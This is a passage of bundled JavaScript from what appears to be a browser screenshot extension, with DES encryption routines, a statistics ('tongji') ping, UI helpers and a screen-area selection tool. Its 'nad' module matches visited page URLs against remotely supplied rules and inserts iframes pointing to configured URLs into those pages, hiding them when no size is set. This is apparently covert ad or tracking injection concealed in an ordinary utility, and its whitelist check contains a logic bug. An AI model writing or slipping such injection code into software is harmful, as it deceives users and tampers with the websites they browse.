            pBoxPermute[14] = sBoxByte[30];
            pBoxPermute[15] = sBoxByte[9];
            pBoxPermute[16] = sBoxByte[1];
            pBoxPermute[17] = sBoxByte[7];
            pBoxPermute[18] = sBoxByte[23];
            pBoxPermute[19] = sBoxByte[13];
            pBoxPermute[20] = sBoxByte[31];
            pBoxPermute[21] = sBoxByte[26];
            pBoxPermute[22] = sBoxByte[2];
            pBoxPermute[23] = sBoxByte[8];
            pBoxPermute[24] = sBoxByte[18];
            pBoxPermute[25] = sBoxByte[12];
            pBoxPermute[26] = sBoxByte[29];
            pBoxPermute[27] = sBoxByte[5];
            pBoxPermute[28] = sBoxByte[21];
            pBoxPermute[29] = sBoxByte[10];
            pBoxPermute[30] = sBoxByte[3];
            pBoxPermute[31] = sBoxByte[24];
            return pBoxPermute;
        }
        function finallyPermute(endByte) {
            var fpByte = new Array(64);
            fpByte[0] = endByte[39];
            fpByte[1] = endByte[7];
            fpByte[2] = endByte[47];
            fpByte[3] = endByte[15];
            fpByte[4] = endByte[55];
            fpByte[5] = endByte[23];
            fpByte[6] = endByte[63];
            fpByte[7] = endByte[31];
            fpByte[8] = endByte[38];
            fpByte[9] = endByte[6];
            fpByte[10] = endByte[46];
            fpByte[11] = endByte[14];
            fpByte[12] = endByte[54];
            fpByte[13] = endByte[22];
            fpByte[14] = endByte[62];
            fpByte[15] = endByte[30];
            fpByte[16] = endByte[37];
            fpByte[17] = endByte[5];
            fpByte[18] = endByte[45];
            fpByte[19] = endByte[13];
            fpByte[20] = endByte[53];
            fpByte[21] = endByte[21];
            fpByte[22] = endByte[61];
            fpByte[23] = endByte[29];
            fpByte[24] = endByte[36];
            fpByte[25] = endByte[4];
            fpByte[26] = endByte[44];
            fpByte[27] = endByte[12];
            fpByte[28] = endByte[52];
            fpByte[29] = endByte[20];
            fpByte[30] = endByte[60];
            fpByte[31] = endByte[28];
            fpByte[32] = endByte[35];
            fpByte[33] = endByte[3];
            fpByte[34] = endByte[43];
            fpByte[35] = endByte[11];
            fpByte[36] = endByte[51];
            fpByte[37] = endByte[19];
            fpByte[38] = endByte[59];
            fpByte[39] = endByte[27];
            fpByte[40] = endByte[34];
            fpByte[41] = endByte[2];
            fpByte[42] = endByte[42];
            fpByte[43] = endByte[10];
            fpByte[44] = endByte[50];
            fpByte[45] = endByte[18];
            fpByte[46] = endByte[58];
            fpByte[47] = endByte[26];
            fpByte[48] = endByte[33];
            fpByte[49] = endByte[1];
            fpByte[50] = endByte[41];
            fpByte[51] = endByte[9];
            fpByte[52] = endByte[49];
            fpByte[53] = endByte[17];
            fpByte[54] = endByte[57];
            fpByte[55] = endByte[25];
            fpByte[56] = endByte[32];
            fpByte[57] = endByte[0];
            fpByte[58] = endByte[40];
            fpByte[59] = endByte[8];
            fpByte[60] = endByte[48];
            fpByte[61] = endByte[16];
            fpByte[62] = endByte[56];
            fpByte[63] = endByte[24];
            return fpByte;
        }
        function getBoxBinary(i) {
            var binary = "";
            switch (i) {
              case 0:
                binary = "0000";
                break;

              case 1:
                binary = "0001";
                break;

              case 2:
                binary = "0010";
                break;

              case 3:
                binary = "0011";
                break;

              case 4:
                binary = "0100";
                break;

              case 5:
                binary = "0101";
                break;

              case 6:
                binary = "0110";
                break;

              case 7:
                binary = "0111";
                break;

              case 8:
                binary = "1000";
                break;

              case 9:
                binary = "1001";
                break;

              case 10:
                binary = "1010";
                break;

              case 11:
                binary = "1011";
                break;

              case 12:
                binary = "1100";
                break;

              case 13:
                binary = "1101";
                break;

              case 14:
                binary = "1110";
                break;

              case 15:
                binary = "1111";
                break;
            }
            return binary;
        }
        function generateKeys(keyByte) {
            var key = new Array(56);
            var keys = new Array();
            keys[0] = new Array();
            keys[1] = new Array();
            keys[2] = new Array();
            keys[3] = new Array();
            keys[4] = new Array();
            keys[5] = new Array();
            keys[6] = new Array();
            keys[7] = new Array();
            keys[8] = new Array();
            keys[9] = new Array();
            keys[10] = new Array();
            keys[11] = new Array();
            keys[12] = new Array();
            keys[13] = new Array();
            keys[14] = new Array();
            keys[15] = new Array();
            var loop = [ 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 ];
            var i, j, k, m;
            for (i = 0; i < 7; i++) {
                for (j = 0, k = 7; j < 8; j++, k--) {
                    key[i * 8 + j] = keyByte[8 * k + i];
                }
            }
            var i = 0;
            for (i = 0; i < 16; i++) {
                var tempLeft = 0;
                var tempRight = 0;
                for (j = 0; j < loop[i]; j++) {
                    tempLeft = key[0];
                    tempRight = key[28];
                    for (k = 0; k < 27; k++) {
                        key[k] = key[k + 1];
                        key[28 + k] = key[29 + k];
                    }
                    key[27] = tempLeft;
                    key[55] = tempRight;
                }
                var tempKey = new Array(48);
                tempKey[0] = key[13];
                tempKey[1] = key[16];
                tempKey[2] = key[10];
                tempKey[3] = key[23];
                tempKey[4] = key[0];
                tempKey[5] = key[4];
                tempKey[6] = key[2];
                tempKey[7] = key[27];
                tempKey[8] = key[14];
                tempKey[9] = key[5];
                tempKey[10] = key[20];
                tempKey[11] = key[9];
                tempKey[12] = key[22];
                tempKey[13] = key[18];
                tempKey[14] = key[11];
                tempKey[15] = key[3];
                tempKey[16] = key[25];
                tempKey[17] = key[7];
                tempKey[18] = key[15];
                tempKey[19] = key[6];
                tempKey[20] = key[26];
                tempKey[21] = key[19];
                tempKey[22] = key[12];
                tempKey[23] = key[1];
                tempKey[24] = key[40];
                tempKey[25] = key[51];
                tempKey[26] = key[30];
                tempKey[27] = key[36];
                tempKey[28] = key[46];
                tempKey[29] = key[54];
                tempKey[30] = key[29];
                tempKey[31] = key[39];
                tempKey[32] = key[50];
                tempKey[33] = key[44];
                tempKey[34] = key[32];
                tempKey[35] = key[47];
                tempKey[36] = key[43];
                tempKey[37] = key[48];
                tempKey[38] = key[38];
                tempKey[39] = key[55];
                tempKey[40] = key[33];
                tempKey[41] = key[52];
                tempKey[42] = key[45];
                tempKey[43] = key[41];
                tempKey[44] = key[49];
                tempKey[45] = key[35];
                tempKey[46] = key[28];
                tempKey[47] = key[31];
                switch (i) {
                  case 0:
                    for (m = 0; m < 48; m++) {
                        keys[0][m] = tempKey[m];
                    }
                    break;

                  case 1:
                    for (m = 0; m < 48; m++) {
                        keys[1][m] = tempKey[m];
                    }
                    break;

                  case 2:
                    for (m = 0; m < 48; m++) {
                        keys[2][m] = tempKey[m];
                    }
                    break;

                  case 3:
                    for (m = 0; m < 48; m++) {
                        keys[3][m] = tempKey[m];
                    }
                    break;

                  case 4:
                    for (m = 0; m < 48; m++) {
                        keys[4][m] = tempKey[m];
                    }
                    break;

                  case 5:
                    for (m = 0; m < 48; m++) {
                        keys[5][m] = tempKey[m];
                    }
                    break;

                  case 6:
                    for (m = 0; m < 48; m++) {
                        keys[6][m] = tempKey[m];
                    }
                    break;

                  case 7:
                    for (m = 0; m < 48; m++) {
                        keys[7][m] = tempKey[m];
                    }
                    break;

                  case 8:
                    for (m = 0; m < 48; m++) {
                        keys[8][m] = tempKey[m];
                    }
                    break;

                  case 9:
                    for (m = 0; m < 48; m++) {
                        keys[9][m] = tempKey[m];
                    }
                    break;

                  case 10:
                    for (m = 0; m < 48; m++) {
                        keys[10][m] = tempKey[m];
                    }
                    break;

                  case 11:
                    for (m = 0; m < 48; m++) {
                        keys[11][m] = tempKey[m];
                    }
                    break;

                  case 12:
                    for (m = 0; m < 48; m++) {
                        keys[12][m] = tempKey[m];
                    }
                    break;

                  case 13:
                    for (m = 0; m < 48; m++) {
                        keys[13][m] = tempKey[m];
                    }
                    break;

                  case 14:
                    for (m = 0; m < 48; m++) {
                        keys[14][m] = tempKey[m];
                    }
                    break;

                  case 15:
                    for (m = 0; m < 48; m++) {
                        keys[15][m] = tempKey[m];
                    }
                    break;
                }
            }
            return keys;
        }
        return {
            e: strEnc,
            d: strDec
        };
    });
})(this.com.jtds.jtds);

(function(R) {
    R.define("tongji", [ "jquery", "constants", "common" ], function($, C, common) {
        function bdTL(source) {}
        return {
            sendActiveTL: function sendActiveTL() {
                setTimeout(function() {
                    var params = common.getRequestParams();
                    if (params.ss) {
                        if (common.checksda(params.t, params.sd)) {
                            common.tr("1");
                        }
                    } else {
                        common.tr("1");
                    }
                    bdTL(params.c);
                }, 5e3);
            }
        };
    });
})(this.com.jtds.jtds);

(function(R) {
    R.define("nad", [ "jquery" ], function($) {
        var nad = {
            rule: null,
            run: function run() {
                var nqr = R.env.nqr || [];
                var insertFun = {
                    a: "insertAfter",
                    b: "insertBefore"
                };
                var rule = this.rule;
                var i, j, h;
                for (i = 0; i < nqr.length; i++) {
                    for (j = 0; j < nqr[i].reg.length; j++) {
                        if (location.href.match(new RegExp(nqr[i].reg[j]))) break;
                    }
                    if (j < nqr[i].reg.length) {
                        if (nqr[i].wl) {
                            for (h = 0; h < nqr[i].wl.length; h++) {
                                if (nqr[i].wl[h] && location.href.indexOf(nqr[i].wl[h] >= 0)) break;
                            }
                        }
                        if (!nqr[i].wl || h === nqr[i].wl.length) {
                            var iframe = $('<iframe  allowTransparency="true" scrolling="no"  frameborder="no" border="0"></iframe>');
                            iframe.attr({
                                src: nqr[i].url,
                                width: nqr[i].w + "px",
                                height: nqr[i].h + "px"
                            });
                            iframe[insertFun[nqr[i].p]](nqr[i].sel);
                            if (!nqr[i].w || !nqr[i].h) {
                                iframe.hide();
                            }
                        }
                    }
                }
            }
        };
        return nad;
    });
})(this.com.jtds.jtds);

(function(R) {
    R.define("ui", [ "jquery", "constants" ], function($, C) {
        var bindDrag = function bindDrag(d, _x, _y) {
            var _canDarg = 0;
            var _oldxy = {
                x: 0,
                y: 0
            };
            if (_x !== 0 && _x !== undefined) {
                _oldxy.x = _x;
            }
            if (_y !== 0 && _y !== undefined) {
                _oldxy.y = _y;
            }
            var p;
            d.mousedown(function(e) {
                _oldxy = {
                    x: e.clientX,
                    y: e.clientY
                };
                p = {
                    left: d.position().left,
                    top: d.position().top
                };
                _canDarg = true;
            });
            $(document).mousemove(function(e) {
                if (_canDarg == 1) {
                    var l = e.clientX - _oldxy.x;
                    var t = e.clientY - _oldxy.y;
                    l = (l >= 0 ? "+=" : "-=") + Math.abs(l);
                    t = (t >= 0 ? "+=" : "-=") + Math.abs(t);
                    d.css("left", l);
                    d.css("top", t);
                    _oldxy = {
                        x: e.clientX,
                        y: e.clientY
                    };
                }
            });
            $(document).mouseup(function(e) {
                _canDarg = false;
            });
        };
        function positionMiddle(d) {
            var position;
            if (document.compatMode === "CSS1Compat") {
                position = {
                    position: "fixed",
                    left: $(window).width() / 2 - d.width() / 2,
                    top: $(window).height() / 2 - d.height() / 2
                };
            } else {
                position = {
                    position: "absolute",
                    left: ($(window).width() || 1024) / 2 - d.width() / 2 + $(window).scrollTop(),
                    top: ($(window).height() || 600) / 2 - d.height() / 2 + $(window).scrollLeft()
                };
            }
            d.css(position);
        }
        return {
            bindDrag: bindDrag,
            positionMiddle: positionMiddle
        };
    });
})(this.com.jtds.jtds);

var cActionEdit = 0;

var cModeVisible = 0;

var cModeEntire = 1;

var cModeSelected = 2;

var cModeBrowser = 3;

var cPluginProModePref = "pluginProMode";

function isScrollableStyle(style) {
    return style && (style.getPropertyValue("overflow") == "scroll" || style.getPropertyValue("overflow") == "auto" || style.getPropertyValue("overflow-y") == "scroll" || style.getPropertyValue("overflow-y") == "auto" || style.getPropertyValue("overflow-x") == "scroll" || style.getPropertyValue("overflow-x") == "auto") && style.getPropertyValue("display") != "none" && style.getPropertyValue("visibility") != "hidden";
}

(function(R) {
    R.define("jtdsAddon", [ "jquery", "common", "constants" ], function($, common, C) {
        var jtdsAddon = {};
        jtdsAddon.FSSelector = function(options) {
            var holder = undefined, wrapper = undefined, info = undefined, onSelected = undefined, selectedElement = undefined, borders = [], outer = [], scrollableElements = [], x1 = 0, x2 = 0, y1 = 0, y2 = 0, prevx = 0, prevy = 0, fTimeout = 0, dbgCntr = 0, ctrlKey = false, destroyed = false, fOnlyAreaSelection = false, extendedMode = options.extendedMode || false, doc = options.doc, browser = options.browser || "chrome", wnd = undefined, docBody = undefined, docScroll = doc.scrollingElement, autoScrollTO, animatedImgDataURL = "data:image/gif;base64,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";
            function init() {
                docBody = doc.body;
                if (typeof window != "undefined") wnd = window;
                if (browser === "firefox") {
                    docBody = doc.compatMode == "CSS1Compat" ? doc.documentElement : doc.body;
                    wnd = content.window;
                }
                if (browser === "ie") {
                    docBody = doc.compatMode == "CSS1Compat" ? doc.documentElement : doc.body;
                }
                if (doc.activeElement && doc.activeElement.tagName === "IFRAME") doc.activeElement.blur();
            }
            function isScrollableStyle(style) {
                return style && (style.getPropertyValue("overflow") == "scroll" || style.getPropertyValue("overflow") == "auto" || style.getPropertyValue("overflow-y") == "scroll" || style.getPropertyValue("overflow-y") == "auto" || style.getPropertyValue("overflow-x") == "scroll" || style.getPropertyValue("overflow-x") == "auto") && style.getPropertyValue("display") != "none" && style.getPropertyValue("visibility") != "hidden";
            }
            function getElementRect(elem, root) {
                var box = elem.getBoundingClientRect(), body = root == doc ? docBody : root, docElem = root == doc ? root.documentElement : root, scrollTop = wnd.pageYOffset || docScroll.scrollTop, scrollLeft = wnd.pageXOffset || docScroll.scrollLeft, clientTop = 0, clientLeft = 0, top = box.top + scrollTop - clientTop, left = box.left + scrollLeft - clientLeft;
                return {
                    top: Math.round(top),
                    left: Math.round(left),
                    width: box.width,
                    height: box.height
                };
            }
            function isElementHidden(elem) {
                var p = elem;
                while (p && p != doc) {
                    var style = doc.defaultView.getComputedStyle(p, "");
                    if (style.visibility === "hidden" || style.display === "none" || style.opacity == 0) return true;
                    p = p.parentNode;
                }
                return false;
            }
            function getScrollableElements() {
                var divTags = doc.getElementsByTagName("div");
                scrollableElements = [];
                for (var i = 0; i < divTags.length; i++) {
                    var elem = divTags[i];
                    if (elem.scrollWidth > 0 && elem.scrollHeight > 0 && (elem.scrollWidth > elem.clientWidth || elem.scrollHeight > elem.clientHeight)) {
                        var style = doc.defaultView.getComputedStyle(elem, "");
                        if (isScrollableStyle(style) && !isElementHidden(elem)) {
                            scrollableElements.push({
                                e: elem,
                                rect: getElementRect(elem, doc)
                            });
                        }
                    }
                }
            }
            function highlightScrollableElements(fShow) {
                if (!extendedMode) return;
                var cntr = 0, div;
                scrollableElements.forEach(function(elem) {
                    var newId = "divFireShotHightlightElement-" + cntr++;
                    if (fShow) {
                        div = doc.createElement("div");
                        div.id = newId;
                        div.style.cssText = "position: absolute; left: " + (elem.rect.left - 3) + "px; top: " + (elem.rect.top - 3) + "px; width: " + elem.rect.width + "px; height: " + elem.rect.height + "px; z-index: 2147483640; border:#fd0 solid 3px;";
                        var info = doc.createElement("div");
                        info.style.cssText = "font-family: Tahoma; font-size:10px; line-height:1.3em; color: #fff; margin:5px; width:auto; height:auto; padding: 2px; background: #000; opacity: 0.9; position:absolute; border:#333 solid 1px;";
                        info.innerHTML = "<img src='" + animatedImgDataURL + "' width='16' height='16'/>" + "&nbsp;Hold the CTRL key and click this area to capture the scrolling content";
                        div.appendChild(info);
                        doc.body.appendChild(div);
                    } else {
                        div = doc.getElementById(newId);
                        if (div) doc.body.removeChild(div);
                    }
                });
            }
            function getScrolledElementAt(x, y) {
                for (var i = 0; i < scrollableElements.length; ++i) {
                    var elem = scrollableElements[i];
                    if (x >= elem.rect.left && x < elem.rect.left + elem.rect.width && y >= elem.rect.top && y <= elem.rect.top + elem.rect.height) {
                        return elem.e;
                    }
                }
                return undefined;
            }
            function scrolledElementExists(e) {
                for (var i = 0; i < scrollableElements.length; ++i) {
                    if (scrollableElements[i].e === e) return true;
                }
                return false;
            }
            function createHTMLHelpers() {
                holder = doc.createElement("div");
                holder.style.cssText = "position: absolute; left: 0px; top: 0px; width: 0px; height: 0px; z-index: 2147483640; cursor: crosshair;";
                info = doc.createElement("div");
                info.style.cssText = "font-family: Tahoma; font-size:14px; color: #fff; bottom: 10px; right: 10px; width:auto; height:auto; padding: 3px; background: #000; opacity: 0.9; position:absolute; border:#333 solid 1px; cursor: crosshair;";
                wrapper = doc.createElement("div");
                wrapper.style.cssText = "position: absolute; left: 0px; top: 0px; opacity: 0; cursor: crosshair; z-index: 2147483641;";
                doc.body.appendChild(wrapper);
                for (var i = 0; i < 4; i++) {
                    borders.push(doc.createElement("div"));
                    var cssText;
                    switch (i) {
                      case 0:
                        cssText = "background: url('data:image/gif;base64,R0lGODlhAQAGAKEAAP///wAAADY2Nv///yH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQACgD/ACwAAAAAAQAGAAACAxQuUgAh+QQBCgADACwAAAAAAQAGAAACA5SAUgAh+QQBCgADACwAAAAAAQAGAAACA5SBBQAh+QQBCgADACwAAAAAAQAGAAACA4QOUAAh+QQBCgADACwAAAAAAQAGAAACAwSEUAAh+QQBCgADACwAAAAAAQAGAAACA4SFBQA7') repeat-y left top;";
                        break;

                      case 1:
                        cssText = "background: url('data:image/gif;base64,R0lGODlhBgABAKEAAP///wAAADY2Nv///yH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQACgD/ACwAAAAABgABAAACAxQuUgAh+QQBCgADACwAAAAABgABAAACA5SAUgAh+QQBCgADACwAAAAABgABAAACA5SBBQAh+QQBCgADACwAAAAABgABAAACA4QOUAAh+QQBCgADACwAAAAABgABAAACAwSEUAAh+QQBCgADACwAAAAABgABAAACA4SFBQA7') repeat-x left top;";
                        break;

                      case 2:
                        cssText = "background: url('data:image/gif;base64,R0lGODlhAQAGAKEAAP///wAAADY2Nv///yH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQACgD/ACwAAAAAAQAGAAACAxQuUgAh+QQBCgADACwAAAAAAQAGAAACA5SAUgAh+QQBCgADACwAAAAAAQAGAAACA5SBBQAh+QQBCgADACwAAAAAAQAGAAACA4QOUAAh+QQBCgADACwAAAAAAQAGAAACAwSEUAAh+QQBCgADACwAAAAAAQAGAAACA4SFBQA7') repeat-y right top;";
                        break;

                      case 3:
                        cssText = "background: url('data:image/gif;base64,R0lGODlhBgABAKEAAP///wAAADY2Nv///yH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQACgD/ACwAAAAABgABAAACAxQuUgAh+QQBCgADACwAAAAABgABAAACA5SAUgAh+QQBCgADACwAAAAABgABAAACA5SBBQAh+QQBCgADACwAAAAABgABAAACA4QOUAAh+QQBCgADACwAAAAABgABAAACAwSEUAAh+QQBCgADACwAAAAABgABAAACA4SFBQA7') repeat-x left bottom;";
                        break;
                    }
                    borders[i].style.cssText = cssText + " opacity: 0.5; position: absolute; cursor: crosshair;";
                    holder.appendChild(borders[i]);
                    outer.push(doc.createElement("div"));
                    outer[i].style.cssText = "position: absolute; background: #000; opacity: 0.3; z-index: 2147483640; cursor: crosshair;";
                    doc.body.appendChild(outer[i]);
                }
                holder.appendChild(info);
                doc.body.appendChild(holder);
            }
            function selectElementMouseMove(e) {
                if (fOnlyAreaSelection || prevx === e.pageX && prevy === e.pageY) return;
                prevx = e.pageX;
                prevy = e.pageY;
                if (fTimeout) clearTimeout(fTimeout);
                fTimeout = setTimeout(function() {
                    if (fOnlyAreaSelection && !e.touchEvent) return;
                    var elemsToHide = [ holder, wrapper, outer[0], outer[1], outer[2], outer[3] ];
                    elemsToHide.forEach(function(elem) {
                        elem.style.setProperty("display", "none", "important");
                    });
                    selectedElement = getScrolledElementAt(e.pageX, e.pageY) || doc.elementFromPoint(e.pageX - docScroll.scrollLeft, e.pageY - docScroll.scrollTop);
                    elemsToHide.forEach(function(elem) {
                        elem.style.setProperty("display", "block", "important");
                    });
                    if (selectedElement) {
                        var rect = getElementRect(selectedElement, doc);
                        x1 = rect.left;
                        y1 = rect.top;
                        x2 = rect.left + rect.width;
                        y2 = rect.top + rect.height;
                        update();
                    }
                }, 15);
            }
            function clearAutoScrollTmr() {
                if (autoScrollTO) {
                    clearTimeout(autoScrollTO);
                    autoScrollTO = undefined;
                }
            }
            function wrapperMouseDown(e) {
                function autoScroll(e) {
                    var speed = 2, shift = {
                        dx: docScroll.scrollLeft,
                        dy: docScroll.scrollTop
                    };
                    clearAutoScrollTmr();
                    if (e.clientX < 100 && prevx > e.pageX) docScroll.scrollLeft -= (100 - e.clientX) / speed;
                    if (e.clientY < 100 && prevy > e.pageY) docScroll.scrollTop -= (100 - e.clientY) / speed;
                    var dX = wnd.innerWidth - e.clientX;
                    if (dX < 100 && prevx < e.pageX) docScroll.scrollLeft += (100 - dX) / speed;
                    var dY = wnd.innerHeight - e.clientY;
                    if (dY < 100 && prevy < e.pageY) docScroll.scrollTop += (100 - dY) / speed;
                    prevx = e.pageX;
                    prevy = e.pageY;
                    shift.dx = docScroll.scrollLeft - shift.dx;
                    shift.dy = docScroll.scrollTop - shift.dy;
                    return shift;
                }
                function wrapperMouseMove(e) {
                    if (e.constructor.name === "TouchEvent" && e.touches.length === 1) {
                        e = e.touches[0];
                        if (e.pageX === e.clientX && docScroll.scrollLeft > 0) {
                            e = {
                                pageX: e.pageX,
                                pageY: e.pageY,
                                clientX: e.pageX - docScroll.scrollLeft,
                                clientY: e.pageY - docScroll.scrollTop
                            };
                        }
                    }
                    if (selectedElement) {
                        if (Math.abs(prevx - e.pageX) > 3 && Math.abs(prevy - e.pageY) > 3) {
                            selectedElement = undefined;
                        } else return;
                    }
                    var shift = autoScroll(e);
                    x2 = shift.dx + e.pageX;
                    y2 = shift.dy + e.pageY;
                    update();
                    autoScrollTO = setTimeout(function() {
                        if (!ctrlKey) {
                            var mimicEvt = {
                                clientX: e.clientX,
                                clientY: e.clientY,
                                pageX: e.pageX + shift.dx,
                                pageY: e.pageY + shift.dy
                            };
                            wrapperMouseMove(mimicEvt);
                        }
                    }, 25);
                }
                function wrapperMouseUp(e) {
                    clearAutoScrollTmr();
                    if (e.constructor.name === "TouchEvent" && e.touches.length === 1) e = e.touches[0];
                    wrapper.removeEventListener("mousemove", wrapperMouseMove, false);
                    wrapper.removeEventListener("touchmove", wrapperMouseMove, false);
                    doc.removeEventListener("mouseup", wrapperMouseUp, false);
                    doc.removeEventListener("touchend", wrapperMouseUp, false);
                    doc.removeEventListener("touchcancel", wrapperMouseUp, false);
                    if (selectedElement && (!extendedMode || !ctrlKey)) {
                        selectedElement = undefined;
                        x1 = x2 = y1 = y2 = 0;
                    }
                    update();
                    completed();
                }
                if (e.constructor.name === "TouchEvent" && e.touches.length === 1) {
                    e.pageX = e.touches[0].pageX;
                    e.pageY = e.touches[0].pageY;
                    e.touchEvent = true;
                    e.button = 0;
                    if (ctrlKey) selectElementMouseMove(e);
                }
                if (e.button == 0) {
                    fOnlyAreaSelection = true;
                    wrapper.removeEventListener("mousedown", wrapperMouseDown, true);
                    wrapper.removeEventListener("touchstart", wrapperMouseDown, true);
                    wrapper.removeEventListener("mousemove", selectElementMouseMove, true);
                    x1 = x2 = e.pageX;
                    y1 = y2 = e.pageY;
                    prevx = e.pageX;
                    prevy = e.pageY;
                    highlightScrollableElements(false);
